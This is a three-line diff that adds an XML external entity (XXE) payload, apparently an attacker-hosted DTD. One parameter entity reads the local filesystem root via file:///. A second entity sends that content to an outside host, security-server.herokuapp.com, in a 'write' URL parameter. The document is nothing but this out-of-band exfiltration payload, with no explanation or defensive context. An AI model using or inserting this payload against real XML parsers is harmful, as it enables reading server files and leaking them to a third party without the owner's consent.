@@ -1,0 +1,3 @@
+<!ENTITY %t1 SYSTEM "file:///">
+<!ENTITY %t2 "<!ENTITY &#37; trick SYSTEM 'http://security-server.herokuapp.com/kekeke/write?y=%t1;'>">
+
